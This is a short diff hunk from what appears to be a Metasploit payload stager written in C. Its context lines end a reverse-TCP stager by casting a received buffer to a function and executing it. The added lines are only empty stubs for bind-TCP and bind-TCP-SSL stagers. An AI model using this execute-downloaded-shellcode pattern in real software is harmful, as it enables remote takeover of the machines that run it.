@@ -104,3 +104,13 @@ void StagerRevereTCP(wchar_t* IP, wchar_t* iPort)
 	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
 	(*(void (*)())buff)();//Bye bye ...
 }
+
+
+void StagerBindTCP(wchar_t* IP, wchar_t* iPort)
+{
+
+};
+void StagerBindTCPSSL(wchar_t* IP, wchar_t* iPort)
+{
+
+};
